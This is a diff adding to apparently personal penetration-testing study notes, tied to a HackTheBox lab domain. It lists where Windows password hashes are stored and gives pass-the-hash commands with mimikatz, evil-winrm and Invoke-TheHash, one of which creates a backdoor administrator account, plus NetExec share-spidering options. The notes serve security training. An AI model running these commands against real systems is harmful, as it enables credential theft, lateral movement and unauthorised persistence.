@@ -85,6 +85,11 @@ Default cres:
 
   https://www.softwaretestinghelp.com/default-router-username-and-password-list/
 
+Where to find pwd hashes:
+  1. SAM
+  2. NTDS.dit
+  3. in ram (lsass.exe)
+
 
 Windows::
   HKLM\SAM  local hash of creds hash
@@ -135,6 +140,12 @@ copy NTDS.dit from C:
 Pass the hash (PtH):
   evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
 
+  mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+
+  PS c:\htb> cd C:\tools\Invoke-TheHash\
+  PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+  PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
+
 
 Hunt pwd:
   https://github.com/AlessandroZ/LaZagne
@@ -169,5 +180,12 @@ Network traffic:
   https://github.com/lgandx/PCredz
 
   https://www.wireshark.org/
-  
+
+
+NetExec (nxc):
+  --shares  find existing shares
+  --spider  recursive search file name
+  --content  recursive search file content
+
+
 
